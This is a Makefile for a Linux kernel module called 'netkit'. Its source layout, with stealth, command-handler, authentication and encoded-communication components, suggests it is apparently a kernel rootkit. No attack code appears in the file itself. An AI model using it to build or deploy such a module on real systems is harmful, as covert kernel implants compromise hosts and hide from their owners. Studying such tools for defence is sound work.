MODULE_NAME := netkit

# Set the list of source files
SRC_FILES += src/netkit.c
SRC_FILES += src/core/iface.c src/core/auth/auth.c src/core/auth/handlers.c src/core/cmd/cmd.c src/core/cmd/handlers.c src/core/packet/packet.c
SRC_FILES += src/encoding/aes/aes.c src/encoding/http/http.c src/encoding/xor/xor.c
SRC_FILES += src/io/iface.c src/io/server/server.c
SRC_FILES += src/stealth/iface.c src/stealth/module/module.c
SRC_FILES += src/sys/crypto.c src/sys/file.c src/sys/mem.c src/sys/socket.c src/sys/symbol.c src/sys/task.c

# Set the flags for the kernel build
EXTRA_CFLAGS := -Wall -I$(PWD) -O3 -std=gnu11 -finline-functions

obj-m := $(MODULE_NAME).o
$(MODULE_NAME)-objs := $(SRC_FILES:.c=.o)

all:
	make -C $(KERNEL_DIR) M=$(PWD) modules
clean:
	make -C $(KERNEL_DIR) M=$(PWD) clean

.PHONY: all clean
